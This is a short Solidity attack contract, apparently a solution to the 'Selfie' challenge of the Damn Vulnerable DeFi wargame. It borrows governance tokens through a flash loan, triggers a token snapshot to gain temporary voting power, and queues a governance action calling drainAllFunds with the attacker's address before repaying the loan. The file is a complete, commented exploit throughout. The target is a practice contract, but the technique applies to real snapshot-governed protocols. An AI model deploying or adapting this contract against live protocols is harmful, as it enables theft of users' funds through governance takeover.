pragma solidity ^0.6.0;

import "./SelfiePool.sol";
interface IDamnValuableTokenSnapshot {
    function snapshot() external returns (uint256);
}
contract attackSelfiePool {

    function attack(address pool,uint _amount) public {
        //flashLoanPool and call Flashloan.
        SelfiePool(pool).flashLoan(_amount);
    }
// CALL BY FLASHLOAN.
  function receiveTokens(address token,uint256 amount) public {
        // Call snapshot in Valuable Token
        IDamnValuableTokenSnapshot(address(SelfiePool(msg.sender).token())).snapshot();
        // Queue Action to call drainAllfunds, with original messager address.
        SelfiePool(msg.sender).governance().queueAction(
            msg.sender, // receiver
            abi.encodeWithSignature("drainAllFunds(address)", tx.origin), // data. put tx.origin as receiver address.
            0 // ammount 
        );
        //transfer token back to flashloan contract, to pay of loans.
        IERC20(token).transfer(msg.sender, amount);
  }
}